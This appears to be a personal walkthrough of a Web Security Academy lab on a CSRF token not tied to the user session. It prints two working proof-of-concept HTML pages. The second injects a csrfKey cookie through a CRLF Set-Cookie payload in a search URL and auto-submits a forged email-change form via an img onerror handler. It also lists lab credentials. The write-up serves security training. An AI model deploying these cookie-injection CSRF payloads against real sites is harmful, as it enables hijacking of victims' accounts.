## Detailed Writeup of Csrf Practitioner Lab(**CSRF where token is not tied to user session**)

Date:-13 January 2026
Level:-Practitioner

Here,i am solving the lab in which Csrf token is not tied to user session,after reading the statement we can conclude easily that there is session key in the website requests mode.

We have provided the credentials given below:-

# Username:Password

  wiener:peter
  
  carlos:montoya

  I just simply login using the credentials  **wiener:peter** and saw a email update section in which i enter the test email and capture the request in burp suite.

  Send the request to repeater and i saw 4 feilds in 2 sections which we can modify to change the request name **Session cookie and csrfKey** in the above section and **email and csrf token** in lower section of request.

  I tried to modify the email and its passes the request,then i get to know about the email modification vunerablity.Later i change the **csrfKey** and **csrf token** which redirects the result to invalid csrf token.

  By this i get to know that we cannot skip these two tokens,then i tried to modify session cookie and it passes the request with *302-Found*.

  Later after getting lost of combination i get to know that the web server is validating **csrfKey** with **csrf token** and the vunerablity.
  So i tried to enter anathor combination of csrfKey an dcsrf token from the anathor account.

  I opened anathor tab and login the credentials using **carlos:montoya** then i capture its csrfKey and csrf token and pasted it in the victim server request and it passes the request.

  Here,we get the vunerablity that the website is only seeing for valid pair of **csrfKey and csrf token** but not validating to whom the token belong to.

  So i saw a request and observe that the method is POST and we need GET request so i searched for differnt differnt feilds of victim user such as search feild,image and other.

  While searching on the web server i capture the request and it gets me the GET menthod so i pass it and capture its cookies.

  I generate the html field using BurpSuite Professional in which i generate CSRF Poc-Generator html field as given below:-

  ```html
  <html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0add0072049b698a86cc983a00e6005f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="v&#64;gm&#46;in" />
      <input type="hidden" name="csrf" value="SKUiD20cGyWVzzA0BmN37eSE9Xo5dbni" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

I added the csrfKey along with the value provided in the html field.
Also, i added the GET method from the search feild which i added in html fiend.

#Modifications:-

1-Adding img src header.
2-Adding host of GET request
3-Added csrfKey
4-Added header named SameSite and onerror.
5-Remove the script from the html feild.


The modifiied code is given below:-

<html>
  <body>
    <form action="https://0add0072049b698a86cc983a00e6005f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="q1234w@gm.in" />
      <input type="hidden" name="csrf" value="AzH8y5CFPNCuN6lsqFkt85Nqx8Kbu2MT" />
    </form>

    <img src="https://0add0072049b698a86cc983a00e6005f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=nzsiTnEAnLtL16Yr0ZWeMbpa1y6v7Xzv%3b%20SameSite=None"
         onerror="document.forms[0].submit()">
  </body>
</html>

Then i store the request in exploit server provided in the lab and send the code to victim server by changing the email and Boom! i just solved the lab.

**Key-Learning**:- Make sure the combination of session cookie always belongs to the correct user otherwise,it can lead to CSRF vunerablity.

Thankyou!!!





